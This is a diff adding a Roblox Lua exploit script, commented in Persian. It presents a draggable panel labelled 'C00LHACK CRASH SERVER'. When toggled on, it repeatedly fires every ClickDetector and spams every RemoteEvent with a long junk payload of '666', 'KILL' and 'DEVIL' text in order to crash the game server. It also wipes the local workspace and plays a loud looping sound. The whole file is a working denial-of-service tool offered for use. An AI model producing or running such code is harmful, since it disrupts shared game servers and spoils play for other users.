@@ -1,0 +1,257 @@
+local SoundService = game:GetService("SoundService")
+local soundId = "rbxassetid://85390427326662"
+
+local function playSound()
+    local sound = Instance.new("Sound")
+    sound.SoundId = soundId
+    sound.Looped = true
+    sound.PlaybackSpeed = 0.18 -- سرعت صدا
+    sound.Volume = 10 -- ولوم متعادل و استاندارد
+    sound.Parent = SoundService -- قرار دادن در SoundService برای پخش شفاف
+    sound:Play()
+end
+
+-- فراخوانی تابع برای اجرای صدا
+playSound()
+
+local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+
+-- ۱. پاکسازی کامل آب و Terrain
+if Workspace:FindFirstChildOfClass("Terrain") then
+    Workspace.Terrain:Clear()
+end
+
+-- ۲. شناسایی تمام آبجکت‌های حیاتی و اجداد (Parents) آن‌ها
+local keepList = {}
+
+-- علامت‌گذاری کاراکتر تمام بازیکن‌ها جهت حفظ شدن
+for _, player in ipairs(Players:GetPlayers()) do
+    if player.Character then
+        keepList[player.Character] = true
+        for _, desc in ipairs(player.Character:GetDescendants()) do
+            keepList[desc] = true
+        end
+    end
+end
+
+-- پیدا کردن ClickDetector و RemoteEvent و علامت‌گذاری کاملِ مسیر و والدین آن‌ها
+for _, obj in ipairs(Workspace:GetDescendants()) do
+    if obj:IsA("ClickDetector") or obj:IsA("RemoteEvent") then
+        keepList[obj] = true
+        
+        -- حفظ تمام فرزندان داخل این آبجکت‌ها
+        for _, child in ipairs(obj:GetDescendants()) do
+            keepList[child] = true
+        end
+        
+        -- حفظ تمام والدها (پارت‌ها، مدل‌ها، پوشه‌ها) تا رسیدن به خود Workspace
+        local current = obj.Parent
+        while current and current ~= Workspace do
+            keepList[current] = true
+            current = current.Parent
+        end
+    end
+end
+
+-- ۳. تابع بازگشتی برای پاکسازی (فقط حذف آیتم‌هایی که در لیست حفظ‌شده‌ها نیستند)
+local function cleanWorkspace(parent)
+    for _, child in ipairs(parent:GetChildren()) do
+        if child ~= Workspace.CurrentCamera and not keepList[child] then
+            pcall(function()
+                child:Destroy()
+            end)
+        else
+            -- اگر این پوشه/مدل خودش باید بمونه، داخلش رو بررسی کن تا موارد اضافی حذف بشن
+            cleanWorkspace(child)
+        end
+    end
+end
+
+cleanWorkspace(Workspace)
+
+-- ۴. ساخت Baseplate از جنس Old Stud Block زیر پای کاراکتر شما
+local localPlayer = Players.LocalPlayer
+local myCharacter = localPlayer and localPlayer.Character
+
+if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
+    local hrp = myCharacter.HumanoidRootPart
+    
+    local baseplate = Instance.new("Part")
+    baseplate.Name = "OldBaseplate"
+    baseplate.Size = Vector3.new(1000, 2, 1000)
+    baseplate.Position = hrp.Position - Vector3.new(0, (hrp.Size.Y / 2) + 1, 0)
+    baseplate.Anchored = true
+    
+    -- ظاهر کلاسیک (Old Stud)
+    baseplate.Material = Enum.Material.Plastic
+    baseplate.TopSurface = Enum.SurfaceType.Studs
+    baseplate.BottomSurface = Enum.SurfaceType.Inlet
+    baseplate.Color = Color3.fromRGB(99, 95, 98)
+    
+    baseplate.Parent = Workspace
+end
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+
+-- حذف پنل قبلی
+if CoreGui:FindFirstChild("AdminPanel_ClickDetector") then
+    CoreGui.AdminPanel_ClickDetector:Destroy()
+end
+
+-- ساخت GUI اصلی
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "AdminPanel_ClickDetector"
+ScreenGui.Parent = CoreGui
+
+-- فریم اصلی (کمی بزرگتر برای جایگیری دکمه جدید)
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 240, 0, 120)
+Frame.Position = UDim2.new(0.5, -120, 0.5, -60)
+Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = Frame
+
+-- تایتل بار قابل درگ
+local TitleBar = Instance.new("TextLabel")
+TitleBar.Size = UDim2.new(1, 0, 0, 30)
+TitleBar.Position = UDim2.new(0, 0, 0, 0)
+TitleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+TitleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleBar.Font = Enum.Font.GothamBold
+TitleBar.TextSize = 13
+TitleBar.Text = "    C00LHACK CRASH SERVER"
+TitleBar.TextXAlignment = Enum.TextXAlignment.Left
+TitleBar.Parent = Frame
+
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 8)
+TitleCorner.Parent = TitleBar
+
+local TitleBlock = Instance.new("Frame")
+TitleBlock.Size = UDim2.new(1, 0, 0, 5)
+TitleBlock.Position = UDim2.new(0, 0, 1, -5)
+TitleBlock.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+TitleBlock.BorderSizePixel = 0
+TitleBlock.Parent = TitleBar
+
+-- دکمه فایر (سایز بزرگتر)
+local FireButton = Instance.new("TextButton")
+FireButton.Size = UDim2.new(0, 180, 0, 50) -- سایز بزرگتر
+FireButton.Position = UDim2.new(0.5, -90, 0, 50)
+FireButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+FireButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+FireButton.Font = Enum.Font.GothamBold
+FireButton.TextSize = 18
+FireButton.Text = "Script: OFF"
+FireButton.Parent = Frame
+
+local ButtonUICorner = Instance.new("UICorner")
+ButtonUICorner.CornerRadius = UDim.new(0, 8)
+ButtonUICorner.Parent = FireButton
+
+-- سیستم Dragging
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+TitleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Frame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+TitleBar.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- لاجیک ON / OFF و فایر همزمان
+local isOn = false
+
+FireButton.MouseButton1Click:Connect(function()
+    isOn = not isOn
+    
+    if isOn then
+        FireButton.Text = "Script: ON"
+        FireButton.TextColor3 = Color3.fromRGB(0, 255, 100)
+        FireButton.BackgroundColor3 = Color3.fromRGB(30, 80, 40)
+        
+        -- حلقه مداوم تا زمانی که وضعیت ON باشه
+        task.spawn(function()
+            while isOn do
+                -- 1. پیدا کردن ClickDetector ها
+                local clickDetectors = {}
+                for _, obj in ipairs(workspace:GetDescendants()) do
+                    if obj:IsA("ClickDetector") then
+                        table.insert(clickDetectors, obj)
+                    end
+                end
+
+                -- 2. پیدا کردن RemoteEvent ها در مسیرهای خواسته شده
+                local remotes = {}
+                local searchContainers = {workspace, Players, ReplicatedStorage}
+                
+                for _, container in ipairs(searchContainers) do
+                    for _, obj in ipairs(container:GetDescendants()) do
+                        if obj:IsA("RemoteEvent") then
+                            table.insert(remotes, obj)
+                        end
+                    end
+                end
+
+                -- فایر کردن ClickDetector ها
+                for i, detector in ipairs(clickDetectors) do
+                    if not isOn then break end
+                    task.spawn(function()
+                        if fireclickdetector then
+                            fireclickdetector(detector)
+                        end
+                    end)
+                    if i % 30 == 0 then task.wait() end
+                end
+
+                -- فایر کردن RemoteEvent ها
+                for i, remote in ipairs(remotes) do
+                    if not isOn then break end
+                    task.spawn(function()
+                        pcall(function()
+                            remote:FireServer("66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666RUNRUNRUNRUNRUNRURNRUNDEVILDEVIL6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666KILLKILLKILL666KILLKILL666C00LHACKCRASHSERVERHAHAHAHAAHAHAHHAAHAHAHAHHAHAHAHAHAHAHAHADDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضضض666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666")
+                        end)
+                    end)
+                    if i % 30 == 0 then task.wait() end
+                end
+
+                task.wait(0) -- فاصله زمانی بین هر پارت فایر کلی
+            end
+        end)
+    else
+        FireButton.Text = "Script: OFF"
+        FireButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        FireButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    end
+end)
